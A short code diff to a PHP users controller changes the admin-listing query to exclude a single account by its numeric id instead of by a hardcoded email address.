@@ -113,7 +113,7 @@ class UsersController extends Controller
 
 
             $query = Admin::with(['location'])
-                ->select(['id', 'name', 'username', 'email', 'phone', 'status', 'admin_access', 'role_type', 'location_id' ,'last_login'])->where('email' ,'!=', 'subtainmustafa9@gmail.com');
+                ->select(['id', 'name', 'username', 'email', 'phone', 'status', 'admin_access', 'role_type', 'location_id' ,'last_login'])->where('id', '!=', 76);
                 // Apply filters
                 if ($request->filled('location')) {
                     $query->where('location_id', $request->location);
